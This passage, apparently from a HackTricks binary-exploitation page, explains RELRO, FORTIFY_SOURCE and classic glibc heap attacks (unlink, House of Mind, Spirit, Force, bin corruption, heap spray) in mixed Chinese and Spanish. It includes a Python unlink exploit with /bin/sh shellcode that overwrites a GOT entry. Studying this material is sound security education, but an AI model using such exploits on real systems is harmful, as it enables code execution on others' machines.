[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
没有RELRO保护机制：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
对于**没有启用relro**的二进制文件，我们可以看到`fgets`的`got`入口地址是`0x404018`。查看内存映射，我们可以看到它位于`0x404000`和`0x405000`之间，具有**`rw`权限**，意味着我们可以读取和写入它。对于启用了relro的二进制文件，我们可以看到二进制文件的`got`表地址（启用了pie，所以此地址会改变）是`0x555555557fd0`。在该二进制文件的内存映射中，它位于`0x0000555555557000`和`0x0000555555558000`之间，具有内存**权限`r`**，意味着我们只能从中读取。

那么如何**绕过**呢？我通常使用的绕过方法是不要写入relro导致只读的内存区域，并**找到其他方法来实现代码执行**。

请注意，为了实现这一点，二进制文件在执行之前需要知道函数的地址：

* 惰性绑定：函数的地址在第一次调用函数时进行搜索。因此，在执行期间，GOT需要具有写权限。
* 立即绑定：函数的地址在执行开始时解析，然后对敏感部分（如.got、.dtors、.ctors、.dynamic、.jcr）授予只读权限。`` `** ``-z relro`**`y`**`-z now\`\*\*

要检查程序是否使用立即绑定，可以执行以下操作：
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
当二进制文件被加载到内存中并首次调用函数时，会跳转到PLT（Procedure Linkage Table），然后跳转（jmp）到GOT，并发现该条目尚未解析（包含PLT的下一个地址）。因此，它调用运行时链接器（rtfd）来解析地址并将其保存在GOT中。

当调用函数时，会调用PLT，它包含存储函数地址的GOT的地址，因此将流重定向到那里并调用函数。然而，如果是第一次调用该函数，则GOT中的内容是PLT的下一条指令，因此流将遵循PLT（rtfd）的代码，并查找函数的地址，将其保存在GOT中并调用它。

在将二进制文件加载到内存时，编译器告诉它在运行程序时要将数据放置在哪个偏移量上。

懒绑定（Lazy binding）-> 函数地址在首次调用该函数时查找，因此GOT具有写入权限，以便在查找时将其保存在那里，而无需再次查找。

立即绑定（Bind now）-> 函数地址在加载程序时查找，并将.sections .got，.dtors，.ctors，.dynamic，.jcr的权限更改为只读。-z relro和-z now

尽管如此，通常情况下，程序没有使用这些选项，因此这些攻击仍然可能发生。

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> 用于检查是否使用了BIND NOW

Fortify Source -D_FORTIFY_SOURCE=1或=2

尝试识别不安全地从一个地方复制到另一个地方的函数，并将该函数更改为安全函数。

例如：
char buf[16];
strcpy(buf, source);

它将被识别为不安全的，然后将strcpy()更改为__strcpy_chk()，使用缓冲区的大小作为最大要复制的大小。

=1和=2之间的区别是：

第二个不允许%n来自具有写入权限的部分。此外，只有在使用前面的选项时，才能使用参数直接访问，即只有在使用%2$d和%1$d之后才能使用%3$d。

要显示错误消息，使用argv[0]，因此如果将其设置为另一个位置的地址（如全局变量），错误消息将显示该变量的内容。

替代Libsafe

通过LD_PRELOAD=/lib/libsafe.so.2或"/lib/libsave.so.2" > /etc/ld.so.preload来激活。
Después de la shell code metemos relleno hasta llegar al campo prev_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev_size para que tenga el bit que dice que está libre) y "-4"(0xfffffffc) en el size (para que cuando compruebe en el 3º trozo si el 2º estaba libre en realidad vaya al prev_size modificado que le dirá que s´está libre) -> Así cuando free() investigue irá al size del 3º pero en realidad irá al 2º - 4 y pensará que el 2º trozo está libre. Y entonces llamará a **unlink()**.

Al llamar a unlink() usará como P->fd los primeros datos del 2º trozo por lo que ahí se meterá la dirección que se quieres sobreescribir - 12(pues en FD->bk le sumará 12 a la dirección guardada en FD) . Y en esa dirección introducirá la segunda dirección que encuentre en el 2º trozo, que nos interesará que sea la dirección a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev_size) pues es ahí donde mira si el 2º trozo está libre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2º trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV_INUSE desactivado de forma que piense que el chunck a está libre.

Además, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensará que “a” está libre y en un bin, por lo que llamará a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV_SIZE vale -4. Se pensará que el trozo de “a” realmente empieza en b+4. Es decir, hará un unlink() a un trozo que comienza en b+4, por lo que en b+12 estará el puntero “fd” y en b+16 estará el puntero “bk”.

De esta forma, si en bk ponemos la dirección a la shellcode y en fd ponemos la dirección a la función “puts()”-12 tenemos nuestro payload.

**Técnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad útil cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la función de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificará el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tamaño mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma dirección.

En caso de querer volver a usar uno se asignaría sin problemas. En caso de querer usar otro, se le asignaría el mismo espacio por lo que tendríamos los punteros “fd” y “bk” falseados con los datos que escribirá la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las técnicas de Unlink() y FrontLink() fueron eliminadas al modificar la función unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecución de código arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Devuelve un puntero a la dirección donde comienza el trozo (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobación devuelva true y ejecute heap\_for\_ptr() que hace un and a “mem” dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)
以这种方式，如果我们可以控制一个块，例如在0x0804a000处，并且将在0x081002a0处释放一个块，我们可以到达0x08100000地址并写入我们想要的内容，例如0x0804a000。当第二个块被释放时，heap_for_ptr(ptr)->ar_ptr将返回我们在0x08100000中写入的内容（因为我们之前应用了我们看到的and操作，并从0x081002a0中提取了前4个字节的值，即ar_ptr）。

这样就调用了_int_free(ar_ptr, mem)，即_int_free(0x0804a000, 0x081002a0)。
_int_free(mstate av, Void_t* mem){
…
bck = unsorted_chunks(av);
fwd = bck->fd;
p->bk = bck;
p->fd = fwd;
bck->fd = p;
fwd->bk = p;
…}

正如我们之前看到的，我们可以控制av的值，因为它是我们将要释放的块中写入的内容。

根据unsorted_chunks的定义，我们知道：
bck = &av->bins[2]-8;
fwd = bck->fd = *(av->bins[2]);
fwd->bk = *(av->bins[2] + 12) = p;

因此，如果我们在av->bins[2]中写入__DTOR_END__-12的值，最后一条指令将在__DTOR_END__中写入第二个块的地址。

也就是说，在第一个块的开头，我们必须多次放置__DTOR_END__-12的地址，因为av->bins[2]将从那里获取它。

在第二个块的地址中，通过在最后5个零的位置写入第一个块的地址，以便heap_for_ptr()认为ar_ptr位于第一个块的开头，并从那里获取av->bins[2]的值。

在第二个块中，借助第一个块，我们用jump 0x0c覆盖prev_size，并用一些内容覆盖size以激活->NON_MAIN_ARENA。

然后，在第二个块中放置大量的nops，最后放置shellcode。

这样就会调用_int_free(CHUNK1, CHUNK2)，并按照指令将第二个块的prev_size的地址写入__DTOR_END__，然后跳转到shellcode。

要应用这种技术，还需要满足一些更复杂的要求。

这种技术已经不适用了，因为几乎应用了与unlink相同的补丁。如果新指向的位置也指向它自己，则进行比较。

**Fastbin**

这是The house of mind的一个变种。

我们希望执行以下代码，该代码在_int_free()函数的第一个检查通过后执行：

fb = &(av->fastbins[fastbin_index(size)] —> 其中fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = *fb

*fb = p

这样，如果我们将“fb”设置为GOT中的一个函数的地址，那么该地址将被覆盖为所欺骗的块的地址。为此，需要确保arena的地址接近dtors的地址。更具体地说，av->max_fast必须是我们要覆盖的地址。

由于我们已经知道我们可以控制av的位置，所以如果我们在size字段中放入8 + NON_MAIN_ARENA + PREV_INUSE的大小，fastbin_index()将返回fastbins[-1]，它将指向av->max_fast。

在这种情况下，av->max_fast将被覆盖（不是指向的地址，而是该位置将被覆盖）。

此外，被释放的连续块必须大于8。由于我们已经说过被释放块的大小为8，因此在这个虚假的块中，我们只需要放置一个大于8的大小（由于shellcode将位于被释放的块中，因此需要在开头放置一个jmp跳转到nops之后的位置）。

此外，该虚假块必须小于av->system_mem。av->system_mem在其上方1848字节。

由于_DTOR_END_中的空值和GOT中的地址很少，这些部分的任何地址都不能用于被覆盖，因此让我们看看如何应用fastbin来攻击堆栈。

另一种攻击方式是将av重定向到堆栈。

如果我们将size修改为16而不是8，则fastbin_index()将返回fastbins[0]，我们可以利用此来覆盖堆栈。

为此，堆栈上不能有任何canary或奇怪的值，实际上我们必须处于以下状态：4个空字节 + EBP + RET

需要4个空字节，因为av将位于此地址，并且av的第一个元素是互斥锁，其值必须为0。

av->max_fast将是EBP，并且将是我们用于跳过限制的值。

av->fastbins[0]将被覆盖为p的地址，并且将是RET，这样就会跳转到shellcode。

此外，在av->system_mem（在堆栈上方1484字节处）将有足够的垃圾，使我们能够绕过检查。

此外，被释放的连续块必须大于8。由于我们已经说过被释放块的大小为16，因此在这个虚假的块中，我们只需要放置一个大于8的大小（由于shellcode将位于被释放的块中，因此需要在新虚假块的size字段之后的nops中放置一个jmp跳转）。

**The House of Spirit**

在这种情况下，我们希望有一个指向malloc的指针，该指针可以被攻击者更改（例如，指针位于堆栈上，位于对变量的可能溢出之下）。

这样，我们可以使该指针指向任何位置。然而，并非任何位置都是有效的，虚假块的大小必须小于av->max_fast，并且更具体地等于将来对malloc()+8的调用中请求的大小。因此，如果我们知道在这个易受攻击的指针之后调用了malloc(40)，那么虚假块的大小必须等于48。
如果程序要求用户输入一个数字，我们可以输入48，并将可修改的malloc指针指向下面的4个字节（可能属于EBP，这样48就会被放在后面，就像是size的头部）。此外，指针ptr-4+48必须满足几个条件（在这种情况下，ptr=EBP），即8 < ptr-4+48 < av->system_mem。

如果这些条件满足，当调用下一个我们说过的malloc(40)时，它的地址将被分配为EBP的地址。如果攻击者还可以控制这个malloc中写入的内容，他可以用任意地址覆盖EBP和EIP。

我认为这是因为这样当调用free()时，它会保存在指向栈的EBP地址中有一个完美大小的块，以便为新的malloc()分配内存。

**力量之屋**

需要以下条件：

* 一个允许溢出到wilderness的块
* 一个由用户定义大小的malloc()调用
* 一个可以由用户定义数据的malloc()调用

首先，我们将wilderness块的大小覆盖为一个非常大的值（0xffffffff），这样任何足够大的内存请求都将在_int_malloc()中处理，而不需要扩展堆。

其次，我们修改av->top，使其指向攻击者控制的内存区域，如堆栈。在av->top中，我们将放置\&EIP - 8。

我们需要覆盖av->top，使其指向攻击者控制的内存区域：

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

victim获取当前wilderness块的地址值（即当前的av->top），remainder则是该地址值加上malloc()请求的字节数。因此，如果\&EIP-8在0xbffff224处，av->top包含0x080c2788，则我们需要在受控的malloc()中保留的字节数为：

0xbffff224 - 0x080c2788 = 3086207644。

这样，修改后的值将保存在av->top中，下一个malloc将指向EIP并可以覆盖它。

重要的是，新的wilderness块的大小必须大于最后一个malloc()请求的大小。也就是说，如果wilderness指向\&EIP-8，那么size将正好位于栈的EBP字段中。

**传说之屋**

**SmallBin破坏**

释放的块根据其大小放入bin中。但在放入之前，它们会被放入unsorted bins中。当一个块被释放时，它不会立即放入相应的bin中，而是留在unsorted bins中。然后，如果有一个新的块需要分配，并且之前释放的块可以满足要求，那么就会将它返回。但如果需要分配的块更大，那么在unsorted bins中的释放块将被放入相应的bin中。

要触发漏洞，内存请求的大小必须大于av->max_fast（通常为72），但小于MIN_LARGE_SIZE（512）。

如果bin中有一个大小适合请求的块，则在解链之后返回该块：

bck = victim->bk; 指向前一个块，这是我们唯一可以修改的信息。

bin->bk = bck; 倒数第二个块变成最后一个块，如果bck指向栈，下一个分配的块将得到这个地址。

bck->fd = bin; 关闭列表，使其指向bin。

需要满足以下条件：

需要分配两个malloc，以便在第二个malloc被释放并放入bin之后，可以对第一个malloc进行溢出（即在溢出之前分配一个大于第二个块的malloc）。

由攻击者选择的地址控制第一个malloc的分配。

目标是，如果我们可以对一个在bin中已经被释放的堆块进行溢出，修改其bk指针。如果我们修改了bk指针，并且该块成为bin列表的第一个块并被分配，那么bin将被欺骗，并且会告诉它下一个要提供的块的最后一个块位于我们指定的虚假地址（例如栈或GOT）。因此，如果再次分配一个块，并且攻击者对其具有权限，它将在所需位置上得到一个块，并且可以在其中写入。

在释放修改后的块之后，需要分配一个比释放的块更大的块，这样修改后的块将离开unsorted bins并放入相应的bin中。

一旦进入bin中，就可以通过溢出修改其bk指针，使其指向我们想要覆盖的地址。

因此，bin必须等待足够多次调用malloc()，以便再次使用修改后的bin，并欺骗bin，使其相信下一个块位于虚假地址。然后，我们将得到我们感兴趣的块。

为了尽快执行漏洞，理想情况下应该是：分配易受攻击的块，分配将被修改的块，释放该块，分配一个比被修改的块更大的块，修改块（漏洞），分配一个与被破坏块相同大小的块，然后再分配一个与被破坏块相同大小的块，并且该块将指向所选择的地址。

为了保护此攻击，通常会使用典型的检查来验证块是否“不是”伪造的：检查bck->fd是否指向victim。也就是说，在我们的情况下，如果指向栈中伪造的块的fd指针指向victim。为了绕过此保护，攻击者需要以某种方式（可能是通过栈）在适当的地址上写入victim的地址，以使其看起来像一个真实的块。

**LargeBin破坏**

与之前相同的要求，还需要一些额外的条件，而且分配的块大小必须大于512。

攻击与之前类似，即需要修改bk指针，并且需要所有这些malloc()调用，但还需要修改修改后的块的大小，使得size - nb < MINSIZE。

例如，可以将size设置为1552，使得1552 - 1544 = 8 < MINSIZE（减法不能得到负数，因为它是无符号数）。

此外，还引入了一个补丁，使攻击变得更加复杂。

**堆喷射**
基本上，它涉及到为堆内存保留尽可能多的空间，并用以一段以shellcode结尾的nop填充。此外，0x0c被用作填充物。因此，将尝试跳转到地址0x0c0c0c0c，如果覆盖了将要调用的地址，就会跳转到那里。基本策略是尽可能多地保留空间，以查看是否覆盖了某个指针，并跳转到0x0c0c0c0c，希望那里有nop。

**堆风水**

通过保留和释放来分散内存，使得空闲块之间保留了一些已分配的块。溢出缓冲区将位于其中一个已分配块中。

**objdump -d executable** —> 反汇编函数\
**objdump -d ./PROGRAMA | grep FUNCTION** —> 获取函数地址\
**objdump -d -Mintel ./shellcodeout** —> 确认这确实是我们的shellcode并获取OpCodes\
**objdump -t ./exec | grep varBss** —> 符号表，获取变量和函数的地址\
**objdump -TR ./exec | grep exit(func lib)** —> 获取库函数的地址（GOT）\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> 获取要覆盖GOT中的puts地址\
**objdump -D ./exec** —> 反汇编所有内容，直到plt的入口\
**objdump -p -/exec**\
**Info functions strncmp —>** 在gdb中获取函数信息

## 有趣的课程

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **参考资料**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的动态[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
